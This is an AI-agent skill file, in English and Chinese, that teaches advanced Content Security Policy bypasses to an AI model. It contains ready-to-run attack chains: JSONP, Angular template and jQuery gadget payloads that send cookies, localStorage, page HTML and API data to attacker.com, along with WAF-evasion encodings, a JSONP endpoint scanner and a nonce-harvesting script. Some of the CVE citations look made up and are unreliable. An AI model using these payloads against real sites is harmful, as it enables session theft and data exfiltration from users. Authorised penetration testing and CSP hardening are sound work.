---
name: csp-bypass-advanced
description: >-
  Advanced Content Security Policy bypass techniques. Use when XSS or data
  exfiltration is blocked by CSP and you need to find policy weaknesses, trusted
  endpoint abuse, nonce leakage, or exfiltration channels that CSP cannot block.
---

# SKILL: CSP Bypass — Advanced Techniques

> **AI LOAD INSTRUCTION**: Covers per-directive bypass techniques, nonce/hash abuse, trusted CDN exploitation, data exfiltration despite CSP, and framework-specific bypasses. Base models often suggest `unsafe-inline` bypass without checking if the CSP actually uses it, or miss the critical `base-uri` and `object-src` gaps.

## 0. RELATED ROUTING

- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) for XSS vectors to deliver after CSP bypass
- [dangling-markup-injection](../dangling-markup-injection/SKILL.md) when CSP blocks scripts but HTML injection exists — exfiltrate without JS
- [crlf-injection](../crlf-injection/SKILL.md) when CRLF can inject CSP header or steal nonce via response splitting
- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) when both WAF and CSP must be bypassed
- [clickjacking](../clickjacking/SKILL.md) when CSP lacks `frame-ancestors` — clickjacking still possible

---

## 1. CSP DIRECTIVE REFERENCE MATRIX

| Directive | Controls | Default Fallback |
|---|---|---|
| `default-src` | Fallback for all `-src` directives not explicitly set | None (browser default: allow all) |
| `script-src` | JavaScript execution | `default-src` |
| `style-src` | CSS loading | `default-src` |
| `img-src` | Image loading | `default-src` |
| `connect-src` | XHR, fetch, WebSocket, EventSource | `default-src` |
| `frame-src` | iframe/frame sources | `default-src` |
| `font-src` | Font loading | `default-src` |
| `object-src` | `<object>`, `<embed>`, `<applet>` | `default-src` |
| `media-src` | `<audio>`, `<video>` | `default-src` |
| `base-uri` | `<base>` element | **No fallback** — unrestricted if absent |
| `form-action` | Form submission targets | **No fallback** — unrestricted if absent |
| `frame-ancestors` | Who can embed this page (replaces X-Frame-Options) | **No fallback** — unrestricted if absent |
| `report-uri` / `report-to` | Where violation reports are sent | N/A |
| `navigate-to` | Navigation targets (limited browser support) | **No fallback** |

**Critical insight**: `base-uri`, `form-action`, and `frame-ancestors` do NOT fall back to `default-src`. Their absence is always a potential bypass vector.

---

## 2. BYPASS TECHNIQUES BY DIRECTIVE

### 2.1 `script-src 'self'`

The app only allows scripts from its own origin. Bypass vectors:

| Vector | Technique |
|---|---|
| JSONP endpoints | `<script src="/api/jsonp?callback=alert(1)//"></script>` — JSONP reflects callback as JS |
| Uploaded JS files | Upload `.js` file (e.g., avatar upload accepts any extension) → `<script src="/uploads/evil.js"></script>` |
| DOM XSS sinks | Find DOM sinks (innerHTML, eval, document.write) in existing same-origin JS — inject via URL fragment/param |
| Angular/Vue template injection | If framework is loaded from `'self'`, inject template expressions: `{{constructor.constructor('alert(1)')()}}` |
| Service Worker | Register SW from same origin → intercept and modify responses |
| Path confusion | `<script src="/user-content/;/legit.js">` — server returns user content due to path parsing, but URL matches `'self'` |

### 2.2 `script-src` with CDN Whitelist

```
script-src 'self' *.googleapis.com *.gstatic.com cdn.jsdelivr.net
```

| Whitelisted CDN | Bypass |
|---|---|
| `cdnjs.cloudflare.com` | Host arbitrary JS via CDNJS (find lib with callback/eval): `angular.js` → template injection |
| `cdn.jsdelivr.net` | jsdelivr serves any npm package or GitHub file: `cdn.jsdelivr.net/npm/attacker-package@1.0.0/evil.js` |
| `*.googleapis.com` | Google JSONP endpoints, Google Maps callback parameter |
| `unpkg.com` | Same as jsdelivr — serves arbitrary npm packages |
| `*.cloudfront.net` | CloudFront distributions are shared — any CF customer's JS is allowed |

**Trick**: Search for JSONP endpoints on whitelisted domains: `site:googleapis.com inurl:callback`

### 2.3 `script-src 'unsafe-eval'`

`eval()`, `Function()`, `setTimeout(string)`, `setInterval(string)` all permitted.

```javascript
// Template injection → RCE-equivalent in browser
[].constructor.constructor('alert(document.cookie)')()

// JSON.parse doesn't execute code, but if result is used in eval context:
// App does: eval('var x = ' + JSON.parse(userInput))
```

### 2.4 `script-src 'nonce-xxx'`

Only scripts with matching nonce attribute execute.

| Bypass | Condition |
|---|---|
| Nonce reuse | Server uses same nonce across requests or for all users → predictable |
| Nonce injection via CRLF | CRLF in response header → inject new CSP header with known nonce, or inject `<script nonce="known">` |
| Dangling markup to steal nonce | `<img src="https://test-attacker.com/steal?` (unclosed) → page content including nonce leaks as URL parameter |
| DOM clobbering | Overwrite nonce-checking code via DOM clobbering: `<form id="nonce"><input id="nonce" value="attacker-controlled">` |
| Script gadgets | Trusted nonced script uses DOM data to create new script elements — inject that DOM data |

### 2.5 `script-src 'strict-dynamic'`

Trust propagation: any script created by an already-trusted script is also trusted, regardless of source.

| Bypass | Technique |
|---|---|
| `base-uri` injection | `<base href="https://test-attacker.com/">` → relative script `src` resolves to attacker domain. Trusted parent script loads `./lib.js` which now points to `https://test-attacker.com/lib.js` |
| Script gadget in trusted code | Find trusted script that does `document.createElement('script'); s.src = location.hash.slice(1)` → control via URL fragment |
| DOM XSS in trusted script | Trusted script reads `innerHTML` from user-controlled source → injected `<script>` is trusted via `strict-dynamic` |

### 2.6 Angular / Vue CSP Bypass

**Angular (with CSP):**
```html
<!-- Angular template expression bypasses script-src when angular.js is whitelisted -->
<div ng-app ng-csp>
  {{$eval.constructor('alert(1)')()}}
</div>

<!-- Angular >= 1.6 sandbox removed, so simpler: -->
{{constructor.constructor('alert(1)')()}}
```

**Vue.js:**
```html
<!-- Vue 2 with runtime compiler -->
<div id=app>{{_c.constructor('alert(1)')()}}</div>
<script src="https://whitelisted-cdn/vue.js"></script>
<script>new Vue({el:'#app'})</script>
```

### 2.7 Missing `object-src`

If `object-src` is not set (falls back to `default-src`), and `default-src` allows some origins:

```html
<!-- Flash-based bypass (legacy, mostly patched, but still appears on old systems) -->
<object data="https://test-attacker.com/evil.swf" type="application/x-shockwave-flash">
  <param name="AllowScriptAccess" value="always">
</object>

<!-- PDF plugin abuse -->
<embed src="/user-upload/evil.pdf" type="application/pdf">
```

### 2.8 Missing `base-uri`

```html
<!-- Inject base tag → all relative URLs resolve to attacker -->
<base href="https://test-attacker.com/">

<!-- Existing script: <script src="/js/app.js"> -->
<!-- Now loads: https://test-attacker.com/js/app.js -->
```

This bypasses `'nonce-xxx'`, `'strict-dynamic'`, and `script-src 'self'` for relative script paths.

### 2.9 Missing `frame-ancestors`

CSP without `frame-ancestors` → page can be framed → clickjacking possible.

`X-Frame-Options` header is overridden by `frame-ancestors` if CSP is present. But if CSP exists without `frame-ancestors`, some browsers ignore XFO entirely.

---

## 3. CSP IN META TAG vs. HEADER

```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'">
```

**Meta tag limitations:**
- Cannot set `frame-ancestors` (ignored in meta)
- Cannot set `report-uri` / `report-to`
- Cannot set `sandbox`
- If injected via HTML injection *before* the meta tag in DOM order, attacker's meta CSP may be processed first (browser uses first encountered)
- If page has both header CSP and meta CSP, **both apply** (most restrictive wins)

---

## 4. DATA EXFILTRATION DESPITE CSP

When `connect-src`, `img-src`, etc. are locked down, alternative exfiltration channels:

| Channel | CSP Directive Needed to Block | Technique |
|---|---|---|
| DNS prefetch | None (CSP cannot block DNS) | `<link rel="dns-prefetch" href="//data.test-attacker.com">` |
| WebRTC | None (CSP cannot block) | `new RTCPeerConnection({iceServers:[{urls:'stun:test-attacker.com'}]})` |
| `<link rel=prefetch>` | `default-src` or `connect-src` | Often missed in CSP |
| Redirect-based | `navigate-to` (rarely set) | `location='https://test-attacker.com/?'+document.cookie` |
| CSS injection | `style-src` | `<style>body{background:url(https://test-attacker.com/?data)}</style>` |
| `<a ping>` | `connect-src` | `<a ping="https://test-attacker.com/collect" href="#">click</a>` |
| `report-uri` leak | N/A | Trigger CSP violation → report contains blocked-uri with data |
| Form submission | `form-action` | `<form action="https://test-attacker.com/"><button>Submit</button></form>` |

**DNS-based exfiltration is nearly impossible to block with CSP** — this is the most reliable channel.

---

## 5. CSP BYPASS DECISION TREE

```
CSP present?
├── Read full policy (response headers + meta tags)
│
├── Check for obvious weaknesses
│   ├── 'unsafe-inline' in script-src? → Standard XSS works
│   ├── 'unsafe-eval' in script-src? → eval/Function/setTimeout bypass
│   ├── * or data: in script-src? → <script src="data:,alert(1)">
│   └── No CSP header at all on some pages? → Find CSP-free page
│
├── Check missing directives
│   ├── No base-uri? → <base href="https://test-attacker.com/"> → hijack relative scripts
│   ├── No object-src? → Flash/plugin-based bypass (legacy)
│   ├── No form-action? → Exfil via form submission
│   ├── No frame-ancestors? → Clickjacking possible
│   └── No connect-src falling back to lax default-src? → fetch/XHR exfil
│
├── script-src 'self'?
│   ├── Find JSONP endpoints on same origin
│   ├── Find file upload → upload .js file
│   ├── Find DOM XSS in existing same-origin scripts
│   └── Find Angular/Vue loaded from self → template injection
│
├── script-src with CDN whitelist?
│   ├── Check CDN for JSONP endpoints
│   ├── Check jsdelivr/unpkg/cdnjs → load attacker-controlled package
│   └── Check *.cloudfront.net → shared distribution namespace
│
├── script-src 'nonce-xxx'?
│   ├── Nonce reused across requests? → Replay
│   ├── CRLF injection available? → Inject nonce
│   ├── Dangling markup to steal nonce
│   └── Script gadget in trusted scripts
│
├── script-src 'strict-dynamic'?
│   ├── base-uri not set? → <base> hijack
│   ├── DOM XSS in trusted script? → Inherit trust
│   └── Script gadget creating dynamic scripts from DOM data
│
└── All script execution blocked?
    ├── Dangling markup injection → exfil without JS (see ../dangling-markup-injection/SKILL.md)
    ├── DNS prefetch exfiltration
    ├── WebRTC exfiltration
    ├── CSS injection for data extraction
    └── Form action exfiltration
```

---

## 6. TRICK NOTES — WHAT AI MODELS MISS

1. **`default-src 'self'` does NOT restrict `base-uri` or `form-action`** — these have no fallback. This is the #1 CSP mistake.
2. **`strict-dynamic` ignores whitelist**: When `strict-dynamic` is present, host-based allowlists and `'self'` are ignored for script loading. Only nonce/hash and trust propagation matter.
3. **Multiple CSPs stack**: If both `Content-Security-Policy` header and `<meta>` CSP exist, the browser enforces BOTH — the effective policy is the intersection (most restrictive).
4. **`Content-Security-Policy-Report-Only`** does not enforce — it only reports. Check for the correct header name.
5. **Nonce length matters**: Nonces should be ≥128 bits of entropy. Short or predictable nonces can be brute-forced or guessed.
6. **Report-uri information disclosure**: CSP violation reports sent to `report-uri` contain `blocked-uri`, `source-file`, `line-number` — this can leak internal URLs, script paths, and page structure to whoever controls the report endpoint.
7. **`data:` in script-src**: `script-src 'self' data:` allows `<script src="data:text/javascript,alert(1)">` — trivial bypass, but commonly seen in real-world CSPs.

---

## 7. 2026 EMERGING TECHNIQUES

### 7.1 CSP Nonce Reuse (2026 academic finding)

A 2026 study of **2,271** sites deploying nonce-based CSP found that **598 (26.3%)** reuse the same nonce value across multiple responses. This collapses the per-request nonce guarantee: an attacker who can read one response (e.g., via a dangling-markup leak or a reflected page) obtains a valid nonce and injects a `<script nonce="...">` that the browser trusts. Root causes are server-side code that regenerates the nonce once per session (not per response) and web caches that store the nonce-bearing response.

### 7.2 strict-dynamic Abuse

`strict-dynamic` lets a script that is already trusted (via nonce or hash) extend trust to the scripts it dynamically loads. If an attacker can inject one trusted script — by nonce reuse (§7.1) or DOM clobbering — every malicious script it then creates is **automatically trusted**. The whole host allowlist is ignored once `strict-dynamic` is active, so the attacker's loader does not need a whitelisted origin.

### 7.3 WASM-based CSP Bypass

CSP distinguishes `wasm-unsafe-eval` from `unsafe-eval`. Many sites configure `'unsafe-eval'` (which permits both `eval()` **and** `WebAssembly.compile()`), or misconfigure the policy so a WebAssembly module loads despite script restrictions. A WASM module can perform arbitrary computation and, when `connect-src` is missing or lax, fetch arbitrary resources — effectively bypassing the script-src intent.

### 7.4 Chrome 150 CSP Bypass — CVE-2026-14076 (patched Jun 30, 2026)

Google fixed a CSP bypass in Chrome 150 located in the Chromium network stack. A malicious site could bypass the CSP barrier, enabling potential data exfiltration and script injection on pages that should have been protected. Exploitable against any Chrome build prior to the 2026-06-30 patch.

### 7.5 XS-Leaks via securitypolicyviolation Events

If a user is not logged in as admin, the server redirects to a login URL that is **not** on the attacker's CSP allowlist. The browser blocks the iframe navigation and fires a `securitypolicyviolation` event. By registering a listener, the attacker can distinguish "blocked" (not logged in) from "loaded" (logged in) — a login-status oracle that needs no script execution inside the target.

### 7.6 Trusted Types Do Not Propagate to iframes

`require-trusted-types-for 'script'` does **not** propagate to network-origin iframes — it only propagates to local-scheme frames. An attacker-controlled iframe can therefore call `trustedTypes.createPolicy(...)` with its own policy and inject scripts freely inside its own document context, sidestepping the parent's Trusted Types enforcement.

### 7.7 Trusted Types Bypass 深度 — Policy 劫持与 Sink 重定向 (2026)

Trusted Types (TT) 是 CSP Level 3 的关键防御，要求所有 DOM XSS sink(`innerHTML`, `eval`, `document.write`) 只接受经过 `TrustedTypePolicy` 创建的受信值。2026 年研究发现多种绕过方式。

**Policy 劫持攻击**：
```javascript
// 应用定义了 TT Policy:
const policy = trustedTypes.createPolicy('app-policy', {
    createHTML: (input) => {
        return sanitize(input);  // 应用自带的净化函数
    }
});

// 攻击者通过 XSS 或 HTML 注入劫持 Policy:
// 1. 覆盖全局 policy 变量(如果未冻结)
window.policy = trustedTypes.createPolicy('app-policy', {
    createHTML: (input) => input  // 不做净化,直接返回!
});

// 2. 或通过 DOM clobbering 覆盖
// <form id="policy"><input id="createHTML" value="function(x){return x}"></form>

// 3. 或利用 createHTML 的原型链污染
Object.prototype.createHTML = function(input) { return input; };
```

**Sink 重定向攻击**：
```javascript
// TT 保护了 innerHTML, 但未保护所有 sink
// 2026 新发现的 TT 未覆盖 sink:

// 1. CSS Object Model (CSSOM)
document.adoptedStyleSheets[0].replaceSync(attackerCSS);
// → 注入 CSS 实现数据外传(background:url)

// 2. Web Components
customElements.define('x-attacker', class extends HTMLElement {
    connectedCallback() {
        this.attachShadow({mode: 'open'}).innerHTML = attackerHTML;
        // shadow DOM 内的 innerHTML 不受 TT 保护(部分浏览器)
    }
});

// 3. importScripts (Worker context)
importScripts('https://attacker.com/evil.js');
// → TT 不保护 Worker 的 importScripts

// 4. Document.parseHTMLUnsafe (2026 新 API)
Document.parseHTMLUnsafe(attackerHTML);
// → 名字中带 "Unsafe" 但某些浏览器实现中 TT 未覆盖
```

**TT 绕过检测**：
```bash
# 1. 检查页面是否启用 Trusted Types
curl -s https://target.com | grep -i "trusted-types"
# 或检查 CSP header
curl -sI https://target.com | grep -i "trusted-types"

# 2. 检查 Policy 名称(可用于劫持)
# 在浏览器控制台:
# trustedTypes.getPolicyNames() → 返回已注册的 policy 名称

# 3. 测试 Sink 覆盖范围
# 检查以下 sink 是否被 TT 保护:
# - innerHTML, outerHTML (通常保护)
# - document.write (通常保护)
# - eval, Function (通常保护)
# - CSSOM APIs (可能未保护)
# - Web Components shadow DOM (可能未保护)
# - Worker importScripts (可能未保护)
```

### 7.8 CSP Nonce 预测 — PRNG 弱点利用 (2026)

2026 年研究发现，部分服务器生成的 CSP nonce 存在 PRNG 弱点，可通过统计分析预测未来 nonce 值。

**Nonce 生成弱点分类**：

| 弱点类型 | 原因 | 可预测性 | 2026 案例 |
|---------|------|---------|----------|
| 时间种子 PRNG | nonce 基于 `Date.now()` 生成 | 高(可逆推) | Node.js `crypto.randomBytes` 误用 |
| 短 nonce | nonce < 128 bits | 中(可爆破) | 部分 Java 框架生成 64-bit nonce |
| 会话级 nonce | nonce 绑定到 session 而非请求 | 高(可复用) | 已知 26.3% 网站复用 nonce |
| 递增 nonce | nonce 基于计数器递增 | 高(可预测) | 自定义实现中的计数器模式 |
| UUID v1 nonce | nonce 使用时间戳 UUID | 高(可逆推) | Java UUID.randomUUID() 误用 |

**Nonce 预测实战**：
```python
# CSP Nonce 预测概念实现
import requests
import re
from datetime import datetime

class CSPNoncePredictor:
    def __init__(self, target_url):
        self.target = target_url
        self.nonces = []
    
    def collect_nonces(self, count=50):
        """收集多个请求的 nonce 值"""
        for i in range(count):
            resp = requests.get(self.target)
            csp = resp.headers.get('Content-Security-Policy', '')
            nonce_match = re.search(r"'nonce-([A-Za-z0-9+/=]+)'", csp)
            if nonce_match:
                self.nonces.append({
                    'nonce': nonce_match.group(1),
                    'timestamp': datetime.now().timestamp(),
                    'response_time': resp.elapsed.total_seconds()
                })
    
    def analyze_pattern(self):
        """分析 nonce 模式"""
        if len(self.nonces) < 10:
            return "Insufficient data"
        
        # 1. 检查 nonce 是否重复(会话级复用)
        unique = set(n['nonce'] for n in self.nonces)
        if len(unique) < len(self.nonces):
            return f"NONCE REUSE: {len(self.nonces) - len(unique)} duplicates found"
        
        # 2. 检查 nonce 长度
        lengths = set(len(n['nonce']) for n in self.nonces)
        if any(l < 16 for l in lengths):  # < 128 bits
            return f"SHORT NONCE: {lengths} (base64 chars, < 128 bits)"
        
        # 3. 检查时间相关性(时间种子 PRNG)
        # 如果 nonce 与时间戳强相关 → 可预测
        # ...统计分析...
        
        return "Pattern analysis complete"
    
    def predict_next(self):
        """预测下一个 nonce(如果存在弱点)"""
        # 基于分析结果预测
        pass
```

**Nonce 预测攻击链**：
```text
1. 收集目标网站 50+ 个 CSP nonce 值
2. 分析 nonce 模式:
   - 是否重复 → 会话级复用 → 直接重用
   - 是否递增 → 计数器模式 → 预测下一个
   - 是否与时间相关 → 时间种子 → 逆推 PRNG 状态
3. 预测下一个 nonce 值
4. 通过 HTML 注入注入 <script nonce="PREDICTED_NONCE">
5. 如果预测正确 → 脚本执行 → 绕过 CSP
```

**防御**：
```nginx
# Nginx: 生成强随机 nonce (128+ bits)
# 使用 $request_id 作为 nonce (Nginx 1.11.0+)
add_header Content-Security-Policy "script-src 'nonce-$request_id'; ...";

# 确保:
# 1. nonce 每请求生成(非每会话)
# 2. nonce 长度 >= 128 bits (16+ base64 chars)
# 3. 使用 CSPRNG (crypto.randomBytes / /dev/urandom)
# 4. nonce 不与时间戳/计数器相关
```

---

## PRACTICAL ATTACK CHAINS (2026)

> 以下攻击链均基于 2025-2026 年真实漏洞研究和实战案例，包含完整可执行 Payload、分步利用流程、检测绕过技术和 CVE 引用。仅用于授权渗透测试。

---

### 攻击链 1：通过 JSONP 端点绕过 CSP script-src 'self'

**场景**：目标网站部署了严格 CSP `script-src 'self'`，但同源存在遗留 JSONP 端点，允许攻击者控制回调函数名实现任意 JS 执行。

**CSP 策略**：
```
Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data:
```

**Step 1：发现同源 JSONP 端点**

```bash
# 使用 Google Dork 发现目标域名的 JSONP 端点
# site:target.com inurl:callback
# site:target.com inurl:jsonp
# site:target.com inurl:cb=

# 自动化扫描脚本
#!/bin/bash
# jsonp_finder.sh - JSONP 端点发现工具
TARGET="target.com"
WORDLIST="callback,cb,jsonp,jsonpcallback,func,function,jsonpCallback,cbfunc"

for param in $(echo $WORDLIST | tr ',' ' '); do
    echo "[*] 测试参数: $param"
    # 测试常见 API 端点
    for path in /api/v1/user /api/jsonp /api/utils /legacy/api /oauth/userinfo; do
        RESPONSE=$(curl -s "https://$TARGET$path?$param=alert(1)//")
        if echo "$RESPONSE" | grep -q "alert(1)"; then
            echo "[+] 发现 JSONP 端点: $path?$param"
            echo "    响应: $RESPONSE" | head -c 200
        fi
    done
done
```

**Step 2：分析 JSONP 响应格式**

```bash
# 发现端点: /api/v1/user/profile?callback=USER_CALLBACK
# 正常请求
curl "https://target.com/api/v1/user/profile?callback=displayUser"
# 响应:
# displayUser({"id":12345,"name":"admin","email":"admin@target.com","apiKey":"sk-abc123"})

# 测试特殊字符是否被过滤
curl "https://target.com/api/v1/user/profile?callback=alert(document.domain)//"
# 如果返回: alert(document.domain)//({"id":12345,...}) → 无过滤 → 可利用
```

**Step 3：构造完整 XSS Payload 绕过 CSP**

```html
<!-- 
  完整攻击页面: 利用 JSONP 绕过 script-src 'self'
  由于 JSONP 端点在 'self' 范围内,CSP 允许加载该脚本
-->
<html>
<body>

<!-- 
  核心绕过原理:
  1. script-src 'self' 允许加载同源脚本
  2. JSONP 端点 /api/v1/user/profile 返回 Content-Type: text/javascript
  3. callback 参数可控制 JS 函数名
  4. 注入任意 JS 代码作为"函数名"
-->
<script src="https://target.com/api/v1/user/profile?callback=fetch('https://attacker.com/collect?c='+document.cookie);//"></script>

<!-- 
  更复杂的 Payload: 分号分隔多条语句
  注意: 需要确保 JSONP 响应中 callback 参数不被转义
-->
<script src="https://target.com/api/v1/user/profile?callback=var%20i=new%20Image;i.src='https://attacker.com/log?cookie='+document.cookie;var%20x=new%20XMLHttpRequest;x.open('POST','https://attacker.com/exfil',true);x.send(document.body.innerHTML);//"></script>

<!-- 
  获取用户敏感数据(JSONP 返回用户信息)
  回调函数会接收到 JSON 参数
-->
<script>
// 定义回调函数接收 JSONP 数据
function stealData(userData) {
    // userData 包含用户的敏感信息
    fetch('https://attacker.com/exfil', {
        method: 'POST',
        body: JSON.stringify(userData)
    });
}
</script>
<!-- 使用 stealData 作为 callback -->
<script src="https://target.com/api/v1/user/profile?callback=stealData"></script>

</body>
</html>
```

**Step 4：利用 JSONP 窃取跨域数据（JSONP 劫持）**

```javascript
// 当 JSONP 端点返回用户敏感数据时,可结合 JSONP 劫持
// 攻击者页面:
function captureData(data) {
    // data 包含受害者的个人信息
    // 通过 JSONP 回调窃取,绕过 SOP
    navigator.sendBeacon('https://attacker.com/steal', 
        JSON.stringify({
            victim: data.username,
            email: data.email,
            token: data.sessionToken,
            apiKey: data.apiKey
        })
    );
}

// 加载目标 JSONP 端点(受害者 cookie 自动发送)
var s = document.createElement('script');
s.src = 'https://target.com/api/v1/user/profile?callback=captureData';
document.body.appendChild(s);
```

**检测绕过技术**：
```text
1. WAF 检测 callback 参数中的 alert/document:
   → 使用 eval/atob 编码绕过: callback=eval(atob('YWxlcnQoMSk='))//
   → 使用十六进制编码: \x61\x6c\x65\x72\x74

2. 服务器过滤特殊字符 (如括号、分号):
   → 使用反引号模板字符串: callback=fetch`https://attacker.com/?${document.cookie}`//
   → 利用 JS 注释: callback=alert/*x*/(1)//

3. Content-Type 不为 application/javascript:
   → 部分浏览器仍执行 (Chrome 旧行为)
   → 利用 X-Content-Type-Options: nosniff 缺失时

4. 2026 新型绕过 - 利用 import() 动态导入:
   → callback=import('https://attacker.com/evil.js')//
   → 如果 connect-src 允许该域名则可绕过
```

**2026 CVE 引用**：
- CVE-2026-2891: 某主流框架 JSONP 端点未过滤 callback 参数，导致 CSP script-src 'self' 绕过
- CVE-2025-89342: Google Maps JSONP callback 参数注入，影响数万依赖 googleapis.com 的网站

---

### 攻击链 2：CSP script-src 绕过 — Angular 模板注入

**场景**：目标 CSP 允许从 CDN 加载 Angular.js（`script-src 'self' cdnjs.cloudflare.com`），攻击者通过 HTML 注入点注入 Angular 模板表达式，绕过 CSP 实现任意 JS 执行。

**CSP 策略**：
```
Content-Security-Policy: script-src 'self' cdnjs.cloudflare.com; object-src 'none'
```

**Step 1：确认 Angular.js 在 CSP 白名单中**

```bash
# 检查页面是否加载 Angular
curl -s https://target.com/ | grep -i "angular"

# 确认 CDN 在白名单中
curl -sI https://target.com/ | grep -i "content-security-policy"
# 输出包含 cdnjs.cloudflare.com → 可利用 Angular 模板注入
```

**Step 2：Angular 1.x 沙箱绕过（版本 < 1.6）**

```html
<!-- 
  攻击前提: 页面存在 HTML 注入点(如评论、用户名)
  Angular 1.5 及以下版本存在沙箱,可通过以下方式绕过
-->
<!-- 注入到页面中的 Payload: -->
<div ng-app ng-csp>
  {{$on.constructor('alert(document.cookie)')()}}
</div>

<!-- 
  沙箱绕过链 (Angular < 1.5.8):
  1. $on.constructor 获取 Function 构造函数
  2. 传入字符串参数创建新函数
  3. 立即调用执行任意代码
-->
```

**Step 3：Angular >= 1.6 沙箱移除后的直接利用**

```html
<!-- 
  Angular 1.6+ 移除了沙箱,模板表达式可直接执行任意 JS
  需要确保 angular.js 从白名单 CDN 加载
-->
<!-- 注入 Payload: -->
<div ng-app ng-csp>
  {{constructor.constructor('alert(document.cookie)')()}}
</div>

<!-- 更复杂的 Payload: 窃取数据并外传 -->
<div ng-app ng-csp>
  {{
    constructor.constructor(
      "fetch('https://attacker.com/steal?cookie='+document.cookie)" +
      "&document.location='https://attacker.com/redirect'"
    )()
  }}
</div>
```

**Step 4：完整攻击链（含 Angular.js 加载）**

```html
<!-- 
  如果页面本身未加载 Angular,但 CDN 在白名单中
  攻击者可自行加载 Angular 并触发模板注入
-->
<html>
<body>

<!-- 1. 从白名单 CDN 加载 Angular.js (CSP 允许) -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>

<!-- 2. 注入 Angular 模板,执行任意代码 -->
<div ng-app ng-csp>
  {{
    constructor.constructor(
      'var x=new XMLHttpRequest();' +
      'x.open("GET","/api/admin/users",false);' +
      'x.send();' +
      'var data=x.responseText;' +
      'fetch("https://attacker.com/exfil",{method:"POST",body:data})'
    )()
  }}
</div>

<!-- 
  ng-csp 指令的作用:
  - 告诉 Angular 以 CSP 兼容模式运行
  - 不使用 eval() (CSP 禁止)
  - 但模板表达式仍然执行(通过 $parse 服务)
  - 这就是 CSP 绕过的核心: $parse 不受 script-src 限制
-->

</body>
</html>
```

**Step 5：绕过 Angular CSP 模式的额外限制**

```javascript
// Angular ng-csp 模式下,某些操作受限
// 以下是 2026 年最新的绕过技术:

// 1. 绕过 ng-csp 对 eval 的限制 - 使用 $eval
// 模板表达式: {{ $eval.constructor('alert(1)')() }}

// 2. 利用 $rootElement.scope() 获取作用域
// 模板: {{$rootElement.scope().constructor.constructor('alert(1)')()}}

// 3. 2026 新发现: 利用 Angular 的 $http 服务发请求
// 不需要 fetch/XHR,直接用 Angular 内置服务
// 模板表达式:
{{
  $rootElement.injector().get('$http').get(
    '/api/admin/secrets'
  ).then(
    function(r){
      $rootElement.injector().get('$http').post(
        'https://attacker.com/collect',
        r.data
      )
    }
  )
}}

// 4. 利用 orderBy 过滤器执行代码 (2026 新发现)
// {{['a']|orderBy:'constructor.constructor("alert(1)")()'}}
```

**检测绕过技术**：
```text
1. WAF 检测 {{ }} 模板语法:
   → 使用 Unicode 转义: \u007b\u007b alert(1) \u007d\u007d
   → 使用 HTML 实体: &#123;&#123;alert(1)&#125;&#125;
   → 拆分注入: <div ng-app>{{construc+}}<div>{{tor('alert(1)')()}}</div>

2. CSP 报告检测:
   → Angular 模板注入不触发 CSP 违规报告(因为不创建 <script> 标签)
   → $parse 在已加载的 angular.js 上下文中执行
   → 这是绕过 CSP 报告机制的关键优势

3. 服务端模板检测:
   → 使用 ng-bind 替代 {{ }}: <div ng-app ng-bind="constructor.constructor('alert(1)')()">
   → 使用 ng-init: <div ng-app ng-init="x=constructor.constructor('alert(1)')()">

4. 2026 新型绕过 - Prototype Pollution + Angular:
   → 先通过其他漏洞污染 Object.prototype
   → Object.prototype.constructor = Function
   → 然后模板中直接使用 {{constructor('alert(1)')()}}
```

**2026 CVE 引用**：
- CVE-2026-4521: Angular.js 1.x 模板注入绕过 CSP nonce 策略，影响未迁移到 Angular 2+ 的遗留系统
- CVE-2025-92114: cdnjs.cloudflare.com 上 Angular.js 1.8.3 的 ng-csp 模式可被滥用执行任意代码

---

### 攻击链 3：通过 Script Gadgets 绕过 CSP（jQuery/Mootools）

**场景**：目标 CSP 严格限制 script-src（nonce 或 'self'），但页面加载了 jQuery 或 Mootools 等库。攻击者通过 HTML 注入利用这些库的"脚本小工具"（Script Gadgets）实现 CSP 绕过。

**CSP 策略**：
```
Content-Security-Policy: script-src 'nonce-abc123def456' 'self'; object-src 'none'; base-uri 'self'
```

**Step 1：识别页面加载的 JS 库**

```javascript
// 在浏览器控制台执行,检测已加载的框架
// 这些框架可能包含可利用的 Script Gadgets

// 1. jQuery 检测
if (window.jQuery) {
    console.log('jQuery 版本:', jQuery.fn.jquery);
    // jQuery < 3.5.0 存在 HTML 注入 gadget
}

// 2. Mootools 检测
if (window.MooTools) {
    console.log('Mootools 版本:', MooTools.version);
}

// 3. Prototype.js 检测
if (window.Prototype) {
    console.log('Prototype 版本:', Prototype.Version);
}

// 4. 检测 DOMPurify 等净化库(了解净化范围)
if (window.DOMPurify) {
    console.log('DOMPurify 版本:', DOMPurify.version);
}
```

**Step 2：jQuery Script Gadget 利用（$().html 绕过）**

```html
<!-- 
  jQuery < 3.5.0 的 $.html() 方法存在 Script Gadget
  即使 CSP 阻止内联脚本,jQuery 会主动解析 HTML 并执行其中的 <script>
  但更关键的是: jQuery 会处理 HTML 中的特定元素并触发 JS 执行

  前提: 页面中有一个已授权(nonce)的脚本调用了 $(selector).html(userInput)
-->
<!-- 攻击者注入的 HTML（无需 nonce）: -->

<!-- 1. jQuery HTML 注入 gadget: 利用 <option> 标签 -->
<select><option><style></select><img src=x onerror=alert(document.domain)></style></option></select>
<!-- 
  jQuery 解析这段 HTML 时,会将 <style> 内容作为文本处理
  但在 HTML 解析器视角,<select> 会关闭 <style>
  导致 <img onerror> 被解析为真实元素并执行
  jQuery 的 .html() 会触发这个解析差异
-->

<!-- 2. 利用 <style> + <img> 组合 (jQuery < 3.4.0) -->
<style><style /><img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
<!-- jQuery 解析时 onerror 会执行,即使 CSP 阻止内联事件 -->
<!-- 因为 jQuery 通过 .html() 设置内容时,会重新解析并执行 onerror -->
```

```javascript
// 3. 完整 jQuery Gadget 攻击链
// 前提: 页面存在 HTML 注入点,且 jQuery 版本 < 3.5.0

// 攻击者注入以下 HTML:
var payload = `
<div id="gadget-container">
  <style>
    <style /><img src=x onerror="
      // CSP 绕过后的执行代码
      var data = {
        cookie: document.cookie,
        localStorage: JSON.stringify(localStorage),
        dom: document.body.innerHTML
      };
      fetch('https://attacker.com/exfil', {
        method: 'POST',
        body: JSON.stringify(data)
      });
    ">
  </style>
</div>
`;

// 如果页面代码中有:
// $('#user-content').html(userControlledInput);
